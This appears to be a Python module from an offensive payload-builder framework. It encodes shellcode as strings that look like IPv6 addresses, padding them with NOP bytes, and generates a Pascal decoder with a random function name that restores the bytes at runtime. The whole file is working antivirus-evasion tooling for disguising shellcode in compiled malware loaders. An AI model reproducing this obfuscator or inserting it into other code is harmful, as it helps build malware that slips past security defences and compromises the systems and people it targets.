import random
import string

class IPv6Obfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        self.decodedLength = len(decoded)
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(':'.join([ f'{chunk[n]:02x}{chunk[n+1]:02x}' for n in range(0, 16, 2)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
function {self.name}(encoded: TStringArray): TBytes;
var
    i: Integer;
    address: String;
    hextets: TStringArray;
    decoded: TBytes;
    j: Integer;
begin

    SetLength(decoded, {self.size*16});
    for i:= Low(encoded) To High(encoded) do
    begin
        address := encoded[i];
        hextets := address.Split([':']);
        for j := Low(hextets) To High(hextets) do
        begin
            decoded[i*16+j*2] := StrToInt('$' + hextets[j]) >> 8;
            decoded[i*16+j*2+1] := StrToInt('$' + hextets[j]) and 255;
        end;
    end;
    Result := Copy(decoded, 0, {self.decodedLength});
end;
"""